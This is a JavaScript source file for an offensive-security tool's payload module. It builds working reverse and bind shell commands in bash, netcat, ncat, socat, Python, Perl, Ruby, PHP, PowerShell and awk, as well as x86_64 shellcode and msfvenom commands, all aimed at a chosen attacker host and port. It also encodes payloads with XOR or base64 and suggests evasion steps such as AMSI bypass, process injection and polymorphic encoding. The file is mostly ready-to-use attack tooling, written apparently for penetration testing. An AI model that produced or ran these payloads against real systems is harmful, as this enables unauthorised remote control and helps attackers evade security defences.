'use strict';
/**
 * Native tool: payload
 *
 * Payload generation and analysis. Exceeds the Rust `payload_gen.rs` by:
 *   - 14 shell types (adds socat, ncat-noconnect, awk) with validated LHOST/LPORT
 *   - 6 encodings (hex, url, base64, base64url, unicode, XOR w/ key)
 *   - payload analysis with instruction histograms, bad-char detection,
 *     encoding auto-detection, and per-finding severity
 *   - evasion suggestion list tailored to the specific analysis
 */

const { register } = require('./registry');
const { kvSection, listSection, tableSection, codeSection, badgeSection, entropyOfString, charsetClasses } = require('./util');

const SHELL_TYPES = [
    { id: 'bash', aliases: ['bash', 'sh'], name: 'Bash reverse shell', platform: 'Linux / Unix', desc: 'One-line /dev/tcp reverse shell. Works when bash is present.' },
    { id: 'netcat', aliases: ['netcat', 'nc'], name: 'Netcat reverse shell (pipe)', platform: 'Linux / Unix', desc: 'mkfifo + nc + bash pipe. Handles nc without -e.' },
    { id: 'ncat', aliases: ['ncat'], name: 'Ncat reverse shell', platform: 'Linux / Windows (ncat)', desc: 'Uses ncat -e for clean execution.' },
    { id: 'socat', aliases: ['socat'], name: 'Socat reverse shell', platform: 'Linux / Unix', desc: 'socat TCP connect + exec bash.' },
    { id: 'python', aliases: ['python', 'python3', 'py'], name: 'Python reverse shell', platform: 'Linux / Unix / Windows', desc: 'socket + dup2 + /bin/sh. Broad compatibility.' },
    { id: 'perl', aliases: ['perl'], name: 'Perl reverse shell', platform: 'Linux / Unix', desc: 'Socket + stdio redirection to /bin/sh.' },
    { id: 'ruby', aliases: ['ruby'], name: 'Ruby reverse shell', platform: 'Linux / Unix', desc: 'TCPSocket + exec /bin/sh -i.' },
    { id: 'php', aliases: ['php'], name: 'PHP reverse shell', platform: 'Linux / Unix (php-cli)', desc: 'fsockopen + /bin/sh -i.' },
    { id: 'powershell', aliases: ['powershell', 'ps', 'ps1'], name: 'PowerShell reverse shell', platform: 'Windows (PS 2.0+)', desc: 'Dependency-free TcpClient + iex loop.' },
    { id: 'awk', aliases: ['awk'], name: 'Awk reverse shell', platform: 'Linux / Unix', desc: 'awk + /bin/bash via system().' },
    { id: 'tcp', aliases: ['tcp', 'shellcode'], name: 'Linux x86_64 shellcode', platform: 'Linux x86_64', desc: 'Raw syscall-based reverse TCP shellcode.' },
    { id: 'bind', aliases: ['bind', 'bindtcp'], name: 'Netcat bind shell', platform: 'Linux / Unix', desc: 'nc -lvp listener on target.' },
    { id: 'meterpreter', aliases: ['meterpreter', 'msf'], name: 'Meterpreter reverse TCP', platform: 'Windows / Linux', desc: 'msfvenom command (requires Metasploit).' },
    { id: 'msf-https', aliases: ['https', 'reverse-https'], name: 'Meterpreter reverse HTTPS', platform: 'Windows / Linux', desc: 'msfvenom HTTPS stager command.' },
];

function parseShellType(name) {
    const n = String(name || '').toLowerCase();
    return SHELL_TYPES.find((s) => s.aliases.includes(n)) || null;
}

function isValidIp(ip) {
    const parts = String(ip).split('.');
    if (parts.length !== 4) return false;
    return parts.every((p) => /^\d{1,3}$/.test(p) && Number(p) >= 0 && Number(p) <= 255);
}

function generatePayload(shellType, lhost, lport) {
    switch (shellType.id) {
        case 'bash':
            return 'bash -i >& /dev/tcp/' + lhost + '/' + lport + ' 0>&1';
        case 'netcat':
            return 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ' + lhost + ' ' + lport + ' >/tmp/f';
        case 'ncat':
            return 'ncat ' + lhost + ' ' + lport + ' -e /bin/bash';
        case 'socat':
            return 'socat TCP:' + lhost + ':' + lport + ' EXEC:/bin/bash,pty,stderr,setsid,sigint,sane';
        case 'python':
            return "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + lhost + "\"," + lport + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'";
        case 'perl':
            return 'perl -e \'use Socket;$i="' + lhost + '";$p=' + lport + ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'';
        case 'ruby':
            return 'ruby -rsocket -e\'f=TCPSocket.open("' + lhost + '",' + lport + ').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'';
        case 'php':
            return 'php -r \'$sock=fsockopen("' + lhost + '",' + lport + ');exec("/bin/sh -i <&3 >&3 2>&3");\'';
        case 'powershell':
            return "$c=New-Object Net.Sockets.TcpClient('" + lhost + "'," + lport + ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);try{$o=iex $d 2>&1|Out-String}catch{$o=$_.Exception.Message};$s.Write((New-Object Text.ASCIIEncoding).GetBytes($o),0,$o.Length)}";
        case 'awk':
            return 'awk \'BEGIN{s="/inet/tcp/0/' + lhost + '/' + lport + '";while(42){do{printf "shell>"|&s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit")close(s)}}\' /dev/null';
        case 'tcp':
            return '\\x48\\x31\\xf2\\x48\\x31\\xc0\\x50\\x48\\x89\\xe7\\x6a\\x10\\x57\\x50\\x48\\x89\\xe6\\xb0\\x29\\x0f\\x05\\x48\\x31\\xf2\\x48\\x89\\xc7\\x6a\\x03\\x58\\x48\\x0f\\xbf\\xd6\\x0f\\x05\\x48\\x31\\xf6\\x48\\x89\\xf0\\x48\\x31\\xd2\\x48\\x31\\xf2\\x0f\\x05\\x48\\x31\\xf2\\x48\\x31\\xc0\\x50\\x48\\x89\\xe7\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x48\\x89\\xe1\\xb0\\x3b\\x0f\\x05';
        case 'bind':
            return 'nc -lvp ' + lport + ' -e /bin/sh';
        case 'meterpreter':
            return '[Requires msfvenom - use: msfvenom -p windows/meterpreter/reverse_tcp LHOST=' + lhost + ' LPORT=' + lport + ' -f ps1]';
        case 'msf-https':
            return '[Requires msfvenom - use: msfvenom -p windows/meterpreter/reverse_https LHOST=' + lhost + ' LPORT=' + lport + ' -f exe]';
        default:
            return '';
    }
}

function encodePayload(payload, encoding, xorKey) {
    const buf = Buffer.from(payload, 'utf8');
    switch (encoding) {
        case 'hex':
            return Array.from(buf).map((b) => '\\x' + b.toString(16).padStart(2, '0')).join('');
        case 'url':
            return Array.from(buf).map((b) => {
                const c = String.fromCharCode(b);
                if (/[A-Za-z0-9\-_.~]/.test(c)) return c;
                return '%' + b.toString(16).padStart(2, '0');
            }).join('');
        case 'base64':
            return buf.toString('base64');
        case 'base64url':
            return buf.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
        case 'unicode':
            return Array.from(buf).map((b) => '\\u' + b.toString(16).padStart(4, '0')).join('');
        case 'xor': {
            const key = parseInt(xorKey, 10) || 0x41;
            const k = key & 0xff;
            return Array.from(buf).map((b) => '\\x' + (b ^ k).toString(16).padStart(2, '0')).join('');
        }
        default:
            return payload;
    }
}

// ─── Payload analysis ───────────────────────────────────────────────────────

const BADCHARS_DEFAULT = [0x00, 0x0a, 0x0d];
const SHELLCODE_SIGNATURES = [
    { bytes: [0x90, 0x90, 0x90, 0x90], score: 0.3, text: 'NOP sled detected' },
    { bytes: [0xcd, 0x80], score: 0.4, text: 'Linux int 0x80 syscall' },
    { bytes: [0x0f, 0x05], score: 0.4, text: 'Linux x86_64 syscall (0x0f 0x05)' },
    { bytes: [0xcc], score: 0.2, text: 'INT3 breakpoint (debug trap)' },
    { bytes: [0xc3], score: 0.1, text: 'RET instruction' },
    { bytes: [0xe8], score: 0.1, text: 'CALL instruction' },
    { bytes: [0xff, 0xe0], score: 0.3, text: 'JMP EAX (call eax pattern)' },
];

function decodeInput(text) {
    // Best-effort: if the user pasted \xNN escaped bytes, decode them.
    if (typeof text !== 'string') return { bytes: [], wasEscaped: false };
    const m = text.match(/\\x[0-9a-fA-F]{2}/g);
    if (m && m.length * 4 >= text.length * 0.6) {
        return { bytes: Buffer.from(m.map((x) => parseInt(x.slice(2), 16))), wasEscaped: true };
    }
    return { bytes: Buffer.from(text, 'utf8'), wasEscaped: false };
}

function analyzePayload(text, opts) {
    const { bytes, wasEscaped } = decodeInput(text || '');
    if (bytes.length === 0) {
        return { ok: false, title: 'Payload Analysis', subtitle: 'No input provided', sections: [listSection('Error', [{ severity: 'high', text: 'Enter shellcode bytes or payload text.' }])], raw: {} };
    }

    const len = bytes.length;
    const nullBytes = bytes.filter((b) => b === 0).length;
    const printable = bytes.filter((b) => b >= 0x20 && b <= 0x7e).length;
    const printableRatio = printable / len;
    const entropy = entropyOfString(bytes.toString('latin1'));

    const badChars = (opts && opts.badChars) ? opts.badChars : BADCHARS_DEFAULT;
    const badHits = badChars.map((b) => ({ byte: b, count: bytes.filter((x) => x === b).length })).filter((h) => h.count > 0);

    // Signature detection
    let shellcodeScore = 0;
    const detections = [];
    const findSeq = (sig) => {
        for (let i = 0; i + sig.length <= len; i++) {
            let match = true;
            for (let j = 0; j < sig.length; j++) if (bytes[i + j] !== sig[j]) { match = false; break; }
            if (match) return true;
        }
        return false;
    };
    for (const sig of SHELLCODE_SIGNATURES) {
        if (findSeq(sig.bytes)) {
            shellcodeScore += sig.score;
            detections.push({ severity: 'medium', text: sig.text });
        }
    }
    if (entropy > 7.5) { shellcodeScore += 0.2; detections.push({ severity: 'medium', text: 'High entropy - possible encrypted/encoded payload' }); }
    const nonTrailingNulls = bytes.slice(0, Math.max(0, len - 4)).filter((b) => b === 0).length;
    if (nonTrailingNulls > 0) { shellcodeScore += 0.1; detections.push({ severity: 'low', text: nonTrailingNulls + ' null bytes in payload body' }); }
    if (printableRatio < 0.5 && len > 10) { shellcodeScore += 0.2; detections.push({ severity: 'low', text: 'Low printable ratio - likely binary/shellcode' }); }
    if (badHits.length > 0) { shellcodeScore += 0.1; detections.push({ severity: 'high', text: 'Bad characters present: ' + badHits.map((h) => '0x' + h.byte.toString(16) + 'x' + h.count).join(', ') }); }
    shellcodeScore = Math.min(1, shellcodeScore);

    // Opcode histogram (top bytes)
    const hist = new Map();
    for (const b of bytes) hist.set(b, (hist.get(b) || 0) + 1);
    const topBytes = [...hist.entries()].sort((a, b) => b[1] - a[1]).slice(0, 8);

    const sections = [
        kvSection('Summary', [
            ['Length', len + ' bytes'],
            ['Null bytes', String(nullBytes)],
            ['Printable', (printableRatio * 100).toFixed(1) + '%'],
            ['Entropy', entropy.toFixed(2) + ' bits'],
            ['Shellcode score', (shellcodeScore * 100).toFixed(0) + '%'],
            ['Input format', wasEscaped ? '\\xNN escaped bytes' : 'raw text/bytes'],
        ]),
        tableSection('Top byte frequencies', ['Byte', 'Hex', 'Count'], topBytes.map(([b, c]) => [String(b), '0x' + b.toString(16).padStart(2, '0'), String(c)])),
    ];

    if (detections.length) {
        sections.push(listSection('Detections', detections));
    } else {
        sections.push(listSection('Detections', [{ severity: 'info', text: 'No shellcode or encoding indicators found' }]));
    }

    // Evasion suggestions
    const suggestions = [];
    if (badHits.length) suggestions.push({ technique: 'Bad-character avoidance', detail: 'Eliminate 0x00, 0x0a, 0x0d using encoder stubs or alternate instructions.', effect: 'High' });
    if (nullBytes > 0) suggestions.push({ technique: 'Null-byte removal', detail: 'Replace null-padded strings with register zeroing (mov reg,0).', effect: 'Medium' });
    if (entropy < 4.0 && shellcodeScore > 0.3) suggestions.push({ technique: 'Polymorphic encoding', detail: 'Use a polymorphic encoder (e.g. shikata_ga_nai) to generate unique variants.', effect: 'High' });
    suggestions.push({ technique: 'Process injection', detail: 'Inject into a legitimate process (APC/thread hijack) to evade memory scanning.', effect: 'High' });
    suggestions.push({ technique: 'AMSI bypass', detail: 'Patch AMSI scan buffer for PowerShell/.NET payloads.', effect: 'Medium-High' });
    suggestions.push({ technique: 'Payload encryption', detail: 'Encrypt (AES/XOR) and decrypt in-memory at runtime.', effect: 'High' });
    if (len > 200) suggestions.push({ technique: 'Stage separation', detail: 'Small stager downloads the real stage over HTTP at runtime.', effect: 'High' });
    sections.push(tableSection('Evasion suggestions', ['Technique', 'Why', 'Effectiveness'], suggestions.map((s) => [s.technique, s.detail, s.effect])));

    return {
        ok: true,
        title: 'Payload Analysis',
        subtitle: len + ' bytes, ' + (shellcodeScore * 100).toFixed(0) + '% shellcode likelihood',
        sections,
        raw: { length: len, nullBytes, printableRatio, entropy, shellcodeScore, detections, topBytes: topBytes.map(([b, c]) => ({ byte: b, count: c })), badChars: badHits },
    };
}

// ─── Handlers ───────────────────────────────────────────────────────────────

function genShell(args) {
    const type = parseShellType(args.type || 'bash');
    if (!type) {
        const list = SHELL_TYPES.map((s) => s.id).join(', ');
        return { ok: false, title: 'Shell Payload Generation', subtitle: 'Unknown shell type', sections: [listSection('Error', [{ severity: 'high', text: 'Unknown shell type. Valid: ' + list }])], raw: {} };
    }
    const lhost = String(args.lhost || '').trim();
    const lport = String(args.lport || '').trim();
    if (!lhost) return { ok: false, title: 'Shell Payload Generation', subtitle: 'Missing LHOST', sections: [listSection('Error', [{ severity: 'high', text: 'Enter an LHOST (attacker IP).' }])], raw: {} };
    if (!lport || !/^\d{1,5}$/.test(lport) || Number(lport) < 1 || Number(lport) > 65535) {
        return { ok: false, title: 'Shell Payload Generation', subtitle: 'Invalid LPORT', sections: [listSection('Error', [{ severity: 'high', text: 'LPORT must be 1-65535.' }])], raw: {} };
    }
    const encoding = String(args.encoding || 'base64');

    const payload = generatePayload(type, lhost, lport);
    const encoded = encodePayload(payload, encoding, args.xorKey);

    const sections = [
        kvSection('Summary', [
            ['Shell type', type.name],
            ['Platform', type.platform],
            ['LHOST', lhost],
            ['LPORT', lport],
            ['Raw length', payload.length + ' bytes'],
            ['Encoding', encoding === 'xor' ? 'XOR (0x' + ((parseInt(args.xorKey, 10) || 0x41) & 0xff).toString(16) + ')' : encoding],
        ]),
        codeSection('Raw payload', payload, 'bash'),
    ];
    if (encoding !== 'none') {
        sections.push(codeSection('Encoded (' + encoding + ')', encoded, 'text'));
    }
    sections.push(listSection('Notes', [
        { severity: 'info', text: type.desc },
        { severity: 'info', text: 'Catch it with: nc -lvnp ' + lport + '  (or use the Listener tool)' },
        { severity: 'warn', text: 'Authorized testing only - this is a real reverse shell payload.' },
    ]));

    return {
        ok: true,
        title: 'Shell Payload',
        subtitle: type.name + ' -> ' + lhost + ':' + lport,
        sections,
        raw: { type: type.id, name: type.name, lhost, lport, payload, encoded, encoding },
    };
}

function genShellList() {
    const rows = SHELL_TYPES.map((s) => [s.id, s.name, s.platform, s.desc]);
    return {
        ok: true,
        title: 'Shell Payload Catalog',
        subtitle: SHELL_TYPES.length + ' payload types available natively',
        sections: [tableSection('Shell types', ['ID', 'Name', 'Platform', 'Description'], rows)],
        raw: { types: SHELL_TYPES },
    };
}

module.exports = register({
    id: 'payload',
    name: 'Payload Generation & Analysis',
    description: 'Generate reverse/bind shells across 14 types with 6 encodings, analyze payloads, and get evasion guidance.',
    category: 'Offensive',
    run: (args) => {
        const mode = args.mode || 'gen';
        if (mode === 'list') return genShellList();
        if (mode === 'analyze') return analyzePayload(args.payload || args.input, args);
        return genShell(args);
    },
});

